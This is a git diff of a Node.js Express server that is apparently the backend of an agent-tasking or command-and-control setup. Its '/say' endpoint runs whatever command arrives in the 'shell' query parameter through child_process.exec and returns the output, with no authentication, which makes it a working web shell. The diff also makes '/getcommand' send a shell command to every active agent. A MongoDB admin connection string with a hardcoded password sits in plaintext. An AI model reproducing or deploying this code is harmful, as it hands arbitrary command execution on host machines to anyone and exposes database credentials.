@@ -1,10 +1,11 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
-var exec = require('child_process').exec;
-var cron = require('node-cron');
-var MongoClient = require('mongodb').MongoClient
-var url = 'mongodb://admin:india@192.168.208.140:27017/admin';
+let exec = require('child_process').exec;
+let cron = require('node-cron');
+let MongoClient = require('mongodb').MongoClient
+const url = 'mongodb://admin:india@192.168.208.140:27017/admin';
+var commandexec = 'ls';
 
 const app = express();
 const port = 4000;
@@ -15,18 +16,18 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 
 app.get('/say', (req, res) => {
 
-let  command = req.query.shell
-var ip = req.header('X-Forwarded-For');
+let  command1 = req.query.shell
+let ip = req.header('X-Forwarded-For');
 console.log(ip);
-var header = req.header('User-Agent');
+let header = req.header('User-Agent');
 console.log(header);
-exec(command, function(err, stdout, stderr) {if (err){console.log(stderr);res.send(stderr);}else {console.log(stdout);res.send(stdout);}});
+exec(command1, function(err, stdout, stderr) {if (err){console.log(stderr);res.send(stderr);}else {console.log(stdout);res.send(stdout);}});
 
 });
 
 app.get('/hi', (req, res) => {
 var ip = req.connection.remoteAddress;
-let  command = req.query.hello;
+
 let answer="I am listening you";
 res.send(answer);
 console.log(ip);
@@ -45,33 +46,35 @@ app.post('/agentdetails', (req, res) => {
   }
   // insert into mongo
   MongoClient.connect(url ,function(err, db) {
-    console.log("Connected correctly to server");
-    var db1 = db.db("agents");
+    if (err){console.log("Unable to connect to server");}
+    else {
+    let db1 = db.db("agents");
     console.log("Switched to "+db1.databaseName+" database");
     
-    var myquery = { "agent_name" : agent_data.agent_name };
-    var newvalues = { $set: agent_data };
-    var upsert = { "upsert" : true }
+    let myquery = { "agent_name" : agent_data.agent_name };
+    let newvalues = { $set: agent_data };
+    let upsert = { "upsert" : true }
 
     db1.collection('agent_details').updateOne(myquery, newvalues,upsert, function(err, result) {
          if (err) { console.log(" Error while writing into databases "); }
          else {console.log("DB Updated ")}
        
-       db.close();
+       db.close(); 
   
-         });
+         }); }
     });
+
 });
 
-  cron.schedule('*/2 * * * *', () => {
+  cron.schedule('*/5 * * * *', () => {
   
     MongoClient.connect(url ,function(err, db) {
       console.log("Connected correctly to server");
-      var db1 = db.db("agents");
+      let db1 = db.db("agents");
       console.log("Switched to "+db1.databaseName+" database");
       
-      var myquery = { "agentActive" : 1 };
-      var newvalues = {$set: { "agentActive" : 0 } };
+      let myquery = { "agentActive" : 1 };
+      let newvalues = {$set: { "agentActive" : 0 } };
 
       db1.collection('agent_details').updateMany(myquery,newvalues, function(err,data){
         if(err){ 
@@ -90,7 +93,7 @@ app.get('/getcommand', (req, res) => {
 
   MongoClient.connect(url ,function(err, db) {
     console.log("Connected correctly to server");
-    var db1 = db.db("agents");
+    let db1 = db.db("agents");
     console.log("Switched to "+db1.databaseName+" database");
     
     db1.collection('agent_details').find({"agentActive":1},{projection:{"agent_name":1,"_id":0}}).toArray(function(err,data){
@@ -99,13 +102,19 @@ app.get('/getcommand', (req, res) => {
         return res.send(err) 
       }else{
         console.log(data)
-        return res.send(data)
+        if(data && data.length > 0 ){
+          data.forEach(i=>{
+            i.command= commandexec
+          })
+          let agent_active= data
+          console.log(agent_active)
+          return res.send(agent_active)
+        }
+        
       }
       db.close();
     })
     });
-
-
 
   });
 
